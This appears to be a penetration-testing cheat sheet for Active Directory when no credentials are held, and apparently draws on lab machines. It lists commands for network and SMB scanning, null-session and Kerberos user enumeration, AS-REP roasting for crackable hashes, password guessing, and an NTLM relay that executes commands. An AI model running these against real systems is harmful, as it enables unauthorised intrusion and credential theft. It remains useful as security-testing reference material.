# No Credentials

## No Credentials

## Network Scanning

### Scan Network

```
nmap -sP -p -Pn <ip>
nmap -Pn -sV --top-ports 50 --open <ip>
nmap -Pn --script-smb-vuln -p139,445 <ip>
nmap -Pn -sC -sV -oN <OutPutFile> <ip>
nmap -Pn -sC -sV -p- -oN <OutPutFile> <ip>
nmap -Pn -sU -sC -sV -oN <OutPutFile> <ip>
nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>
```

### SNMP Check

```
snmp-check 10.10.31.2 -c openview
```

### CME

<pre><code><strong>#Map Hosts
</strong><strong>cme smb 192.168.1.0/24
</strong><strong>
</strong><strong>#Map SMB hosts that DO NOT require signing
</strong>cme smb 192.168.1.0/24 --gen-relay-list relaylistOutputFilename.txt

#Enumerate Null Sessions
cme smb 10.10.10.161 -u '' -p ''
cme smb 10.10.10.161 --pass-pol
cme smb 10.10.10.161 --users
cme smb 10.10.10.161 --groups

#Enumerate Anonymous Login
cme smb 10.10.10.178 -u 'a' -p ''

#Extract Subnet
cme ldap &#x3C;ip> -u &#x3C;user> -p &#x3C;pass> -M get-network
cme ldap &#x3C;ip> -u &#x3C;user> -p &#x3C;pass> -M get-network -o ONLY_HOSTS=true
cme ldap &#x3C;ip> -u &#x3C;user> -p &#x3C;pass> -M get-network -o ALL=true
</code></pre>

### GoBuster

```
gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt
```

### Find DC IP

```
nmcli dev show eth0 #Shows domain names and DNS
nslookup -type=SRV_ldap_tcp.dc_msdcs <domain>
```

### Zone Transfer

```
dig axfr @10.10.10.192 blackfield.local
dig @10.10.10.192 ForestDnsZones.BLACKFIELD.local
```

### LDAP Search

```
ldapsearch -H 10.10.10.192 -x -s base namingcontexts
```

### wfuzz vhost discovery

```
sudo wfuzz -c -f subdomains.txt -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://flight.htb/" -H "Host: FUZZ.flight.htb" --hl 154
```

### List Guest Access on SMB Share

```
enum4linux -a -u "" -p "" <dc-ip>
enum4linux -a -u "guest" -p "" <dc-ip>

smbmap -u "" -p "" -P 445 -H <dc-ip>
smbmap -u "guest" -p "" -P 445 -H <dc-ip>

smbclient -U "%" -L //<dc-ip>
smbclient -U "guest%" -L //<dc-ip>

cme smb <ip> -u "" -p ""
cme smb <ip> -u "a" -p ""
```

## Enumerate Users

### CME

<pre><code><strong>#Check for anon login
</strong><strong>cme smb domain.local  -u '' -p '' --users
</strong>cme smb domain.local  -u '' -p '' --users | awk '{print $4}' | uniq

#Check for users/groups and active sessions
cme smb 10.10.10.10 --users
cme smb 10.10.10.10 --groups 
cme smb 10.10.10.10 --groups --loggedon-users 

#Check if account exists without kerberos
cme ldap 192.168.1.0/24 -u users.txt -p '' -k

#Check for ASREPRoastable
cme ldap 192.168.0.104 -u user.txt -p '' --asreproast output.txt
</code></pre>

### Kerbrute

```
kerbrute userenum -d test.local usernames.txt
```

### Impacket

```
impacket-GetNPUsers -no-pass -dc-ip 10.10.10.192 blackfield.local
GetNPUsers.py -no-pass -usersfile names.txt -format hashcat -dc-ip 10.10.10.169 MEGABANK.LOCAL/
```

### NMAP

```
nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>
```

### MetaSploit

```
msf> use auxiliary/gather/kerberos_enumusers
msf> use auxiliary/scanner/smb/smb_lookupsid
```

### SMBmap

```
python3 smbmap.py --host-file smb-hosts.txt -d test.local -L
```

### Rubeus

```
Rubeus.exe /users:usernames.txt /passwords:passwords.txt /domain:test.local /outfile:found_passwords.txt
```

### NTLMRelay

```
python3 ntlmrelayx.py -smb2support -t smb://10.10.10.1 -c 'whoami /all' -debug
```

